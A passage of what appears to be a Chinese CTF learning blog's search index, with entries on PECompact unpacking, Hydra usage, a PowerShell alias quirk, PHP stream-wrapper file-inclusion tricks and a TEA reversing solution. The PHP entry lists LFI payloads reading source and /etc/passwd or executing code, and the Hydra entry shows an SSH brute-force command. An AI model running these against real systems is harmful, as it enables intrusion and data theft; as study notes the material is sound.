    <content type="html"><![CDATA[<h3 id="PEcompact脱壳"><a href="#PEcompact脱壳" class="headerlink" title="PEcompact脱壳"></a>PEcompact脱壳</h3><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122017434.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>3<br>BP VirtualFree<br>F9到达取消断点<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017793.png" srcset="/img/loading.gif" lazyload><br>返回到用户代码alt+f9<br>查找PUSH 8000<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017787.png" srcset="/img/loading.gif" lazyload><br>然后单步到达<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017628.png" srcset="/img/loading.gif" lazyload></p></blockquote><blockquote><p>4<br>BP VirtualFree<br>两次shift+f9到达<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017209.png" srcset="/img/loading.gif" lazyload><br>返回到用户代码alt+f9<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017851.png" srcset="/img/loading.gif" lazyload><br>然后单步跟踪到达oep</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122017705.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>5<br>bp 0045DE74<br>运行,到达后取消断点<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018701.png" srcset="/img/loading.gif" lazyload><br>在retn处会返回并执行程序我们现在下面下个断点，然后单步到OEP<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018935.png" srcset="/img/loading.gif" lazyload><br>这一段汇编比较重要注意在retn后面加上断点</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122018816.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>6<br>bp VirtualAlloc<br>shift+f9,取消断点,返回用户代码alt+f9<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018918.png" srcset="/img/loading.gif" lazyload><br>查找jump<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018029.png" srcset="/img/loading.gif" lazyload><br>单步到OEP</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122018091.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>7  取消异常<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018128.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018041.png" srcset="/img/loading.gif" lazyload><br>利用shift+f9,两次过后发现跑飞，利用第二次的SE句柄地址，（如果发现单词就跑飞了那是应为吾爱破解od中的插件strongod的过在option中将skip some Exception取消就行）<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122019809.png" srcset="/img/loading.gif" lazyload><br>查找句柄<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018041.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122019805.png" srcset="/img/loading.gif" lazyload></p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122019946.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>8  两次内存<br>注意对比跳跃代码<br>9  at Getversion<br>到达OEP的下方</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工具使用说明书</title>
    <link href="/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="工具使用说明书"><a href="#工具使用说明书" class="headerlink" title="工具使用说明书"></a>工具使用说明书</h1><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>hydra -l root -p root 127.0.0.1 -s 2111 ssh -f<br>-l： LOGIN      指定破解的用户，对特定用户破解。<br>-L：FILE     指定用户名字典。<br>-p：PASS ，指定密码破解，少用，一般是采用密码字典。<br>-P： FILE   指定密码字典文件<br>-s： PORT 指定爆破端口<br>-M：FILE    指定目标列表文件<br>-C： FILE   使用冒号分割格式，例如“登录名 : 密码”来代替-L&#x2F;-P参数。<br>-f：  在使用-M参数以后，找到第一对登录名或者密码的时候中止破解</p><blockquote><p>ps:我们可以利用hydra -h来查看帮助</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>脚本命令和普通命令的区别</title>
    <link href="/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/"/>
    <url>/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/</url>
    
    <content type="html"><![CDATA[<h3 id="脚本命令和普通命令的区别"><a href="#脚本命令和普通命令的区别" class="headerlink" title="脚本命令和普通命令的区别"></a>脚本命令和普通命令的区别</h3><blockquote><p>在我们将windows系统调成可以执行脚本命令之后我们的许多命令在cmd或ise中可能无法执行这可能是因为命名的原因   </p></blockquote><p>开启脚本执行之前</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\agesh&gt; where calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><p>开启之后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\data\code&gt; where calc<br>PS C:\data\code&gt;<br></code></pre></td></tr></table></figure><p>解决办法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where.exe calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where  [cc lang=&quot;powershell&quot;]<br>cmdlet Where-Object at command pipeline position 1<br>Supply values for the following parameters:<br>Property:<br></code></pre></td></tr></table></figure><blockquote><p>所以在写入where calc时执行的其实是where-object cacl这是没有返回值的，不是执行where.exe calc<br>但是在非脚本名模式下不会识别位where-object于是可以正常执行</p></blockquote><p><a href="https://www.codenong.com/16775686/">相关链接</a></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>script</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议</title>
    <link href="/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><ol><li><p>file:&#x2F;&#x2F; 访问本地文件系统</p></li><li><p>http:&#x2F;&#x2F; 访问HTTP(S)网址</p></li><li><p>ftp:&#x2F;&#x2F; 访问FTP(S)URL</p></li><li><p>php:&#x2F;&#x2F; 访问各个输出输入流</p></li><li><p>zlib:&#x2F;&#x2F; 处理压缩流</p></li><li><p>data:&#x2F;&#x2F; 读取数据</p></li><li><p>glob:&#x2F;&#x2F; 查找匹配的文件路径模式</p></li><li><p>phar:&#x2F;&#x2F; PHP归档</p></li><li><p>rar:&#x2F;&#x2F; RAR数据压缩</p></li></ol><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 是一种利用 PHP 流封装器 (php:&#x2F;&#x2F;filter) 的方式，常用于漏洞利用中，特别是在文件包含或文件读取的攻击场景中。让我们逐步分析其含义：</p><p>分解说明：<br>php:&#x2F;&#x2F;filter：</p><p>php:&#x2F;&#x2F; 是 PHP 的一种流封装协议，它允许直接读取或写入输入、输出、错误流以及其他特殊资源。<br>filter 是一种流过滤器，允许对流进行特定的操作，如编码、解码、压缩、加密等。<br>convert.base64-encode：</p><p>这是流过滤器的一个转换操作，它会将文件内容进行 Base64 编码。Base64 是一种将二进制数据转换为 ASCII 字符的编码方式，常用于网络传输。<br>convert.base64-encode 指定要对目标文件内容进行 Base64 编码。<br>resource&#x3D;flag.php：</p><p>resource 指定了你要操作的文件资源。在这个例子中，flag.php 是目标文件，通常是一个包含敏感信息或标志的文件，可能不允许直接通过浏览器访问。<br>通过流封装器，PHP 会读取 flag.php 的内容，并在流操作中将其进行 Base64 编码。<br>整体功能：<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 的作用是：</p><p>读取 flag.php 文件的内容。<br>使用 Base64 编码对文件内容进行编码。<br>返回编码后的文件内容，而不是直接返回原始内容。<br>典型的利用场景：<br>这通常用于 本地文件包含（LFI）漏洞。在存在 LFI 漏洞的系统中，攻击者可以利用 PHP 的 include、require、file_get_contents 等函数读取任意文件，但有时文件包含被限制或敏感文件的内容不可见。</p><p>通过 php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php，攻击者可以绕过某些限制，读取文件并获取其 Base64 编码内容。然后，攻击者可以手动将 Base64 内容解码，查看文件的原始内容。</p><h3 id="include-once-file"><a href="#include-once-file" class="headerlink" title="include_once($file)"></a>include_once($file)</h3><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><ul><li>如果文件成功包含，include_once 将会返回 1</li><li>如果文件没有被找到或者在尝试包含文件过程中有错误，include_once 不会返回任何值，但会产生一个警告（除非 error_reporting 被设置成忽略警告）。</li></ul><h4 id="各类文件类型的输出情况"><a href="#各类文件类型的输出情况" class="headerlink" title="各类文件类型的输出情况"></a>各类文件类型的输出情况</h4><p>include_once 的参数不是一个 PHP 文件，那么该文件的内容会被直接输出（或执行，如果有可执行的 PHP 代码）到输出流中。具体的行为取决于该文件的内容和类型。  </p><ol><li><strong>纯文本文件（比如 .txt）</strong>: 文件的内容会被直接输出。</li><li><strong>HTML 文件（比如 .html 或 .htm）</strong>: HTML 代码会被直接输出，浏览器会按照 HTML 来渲染。</li><li><strong>XML 文件或其他标记语言文件</strong>: 文件的内容会被直接输出。</li><li><strong>二进制文件（比如图片或者音频文件）</strong>: 这样做通常不是个好主意，因为二进制数据可能会被错误地解释为文本，导致输出乱码或产生不可预测的结果。</li><li><strong>包含 PHP 代码的非 PHP 文件</strong>: 如果文件中混合有 PHP 代码（即使文件扩展名不是 .php），那么那部分 PHP 代码仍然会被执行。</li></ol><h3 id="前置学习要求"><a href="#前置学习要求" class="headerlink" title="前置学习要求"></a>前置学习要求</h3><h4 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h4><blockquote><p>文件包含所可能有的函数<br>php当中会造成文件包含漏洞的函数有：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file<br>实现方法</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span> ?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#GET数据</span><br><span class="hljs-number">2</span> ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  <span class="hljs-comment">#后面的base64字符是需要传入的字符串的base64编码</span><br><span class="hljs-number">3</span> ?file=php:<span class="hljs-comment">//input [POST DATA:]&lt;?php phpinfo()?&gt;  #POST数据</span><br><span class="hljs-number">4</span> ?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=xxx.php  #get读源码</span><br></code></pre></td></tr></table></figure><h4 id="php伪协议-1"><a href="#php伪协议-1" class="headerlink" title="php伪协议"></a>php伪协议</h4><blockquote><p>需要开启allow_url_fopen的：php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory和php:&#x2F;&#x2F;temp<br>不需要开启allow_wrl_fopen的：php:&#x2F;&#x2F;filter<br>在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码<br>php:&#x2F;&#x2F;input需要post请求提交数据<br>php:&#x2F;&#x2F;filter可以get提交?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p></blockquote><h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?xxx=data:<span class="hljs-comment">//text/plain;base64,想要file_get_contents()函数返回的值的base64编码</span><br>?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><blockquote><p>File:&#x2F;&#x2F; 访问本地文件系统<br>file:&#x2F;&#x2F; 用于访问本地文件系统，如c:盘中的东西。在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。<br>file:&#x2F;&#x2F; [文件的绝对路径和文件名]<br>linux 系统环境下：?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>winows 系统环境下：?file&#x3D;file:&#x2F;&#x2F;&#x2F;E:\phpStudy\WWW\code\phpinfo.php</p></blockquote><p>总结：File协议用于读取系统文件，c盘关键内容。Php:&#x2F;&#x2F;filter 用来读取文件内容，但是要base64后出来，否则会造成文件执行从而只看到执行结果。Php:&#x2F;&#x2F;input（代码执行）可将post请求中的数据作为PHP代码执行。可以用于写木马。Data和input相似，可以代码执行，但只有在php&lt;5.3且include&#x3D;on时可以写木马。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tea.dm</title>
    <link href="/2024/09/10/tea/"/>
    <url>/2024/09/10/tea/</url>
    
    <content type="html"><![CDATA[<h1 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h1><p>终于自己做出一道tea了乐<br>看原题<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122053979.png" srcset="/img/loading.gif" lazyload><br>&emsp;典型的tea直接套模板，但是有问题，就是py中不会限定为32位所以最后的答案会超级大，我们就要去进行一个&amp;ffffffff的操作使数值正确<br>&emsp;然后就是关于题目中的小问题，首先就是delta，标准的tea是0x9E3779B9，但是在ida中总是会出现变成-0x61c88647的问题需要注意，然后就是最后的v5怎么求,就是一个偏移相加，在exp中有了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v0, v1</span>):<br>    delta = <span class="hljs-number">0x9E3779B9</span><br>    v3 = delta * <span class="hljs-number">32</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v1 = (v1 - ((v0 + v3) ^ (<span class="hljs-number">16</span> * v0 + <span class="hljs-number">1634038898</span>) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1634038904</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 = (v0 - ((v1 + v3) ^ (<span class="hljs-number">16</span> * v1 + <span class="hljs-number">1702060386</span>) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1870148662</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v3 = (v3 - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v0, v1<br><span class="hljs-comment">#已知的加密结果</span><br>v4 = <span class="hljs-number">676078132</span><br>v5 = <span class="hljs-number">957400408</span><br><span class="hljs-comment">#解密</span><br>v10, v11 = decrypt(v4, v5)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted v10: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v10)&#125;</span>, v11: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v11)&#125;</span>&quot;</span>)<br>i=<span class="hljs-number">0x49BD</span><br>j=<span class="hljs-number">0x8e00</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(j)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(i|(j&lt;&lt;<span class="hljs-number">16</span>)))<br><span class="hljs-comment">#moectf&#123;836153a5-8e00-49bd-9c42-caf30620caaf&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
